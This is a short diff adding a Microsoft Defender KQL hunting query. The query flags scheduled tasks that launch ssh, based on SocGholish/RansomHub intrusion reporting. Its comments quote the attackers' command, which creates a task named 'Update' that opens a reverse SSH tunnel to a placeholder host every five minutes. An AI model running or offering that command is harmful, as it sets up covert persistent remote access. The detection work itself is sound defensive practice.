@@ -1,0 +1,11 @@
+## schtasks - reverse ssh shell
+## SOCGHOLISH RANSOMHUB
+## https://www.trendmicro.com/en_us/research/25/c/socgholishs-intrusion-techniques-facilitate-distribution-of-rans.html
+
+## IOC : 
+## SCHTASKS /create /tn "Update" /tr "ssh.exe -R 2525 -p 443 -o StrictHostKeyChecking=no cvhjkluytrdcvjytfasdv@IP /sc minute /mo 5
+## SCHTASKS /run /tn "Update"
+
+DeviceProcessEvents
+| where ProcessCommandLine contains "SCHTASKS /create" and ProcessCommandLine contains "ssh"
+| project Timestamp, DeviceName, ProcessCommandLine, AccountName
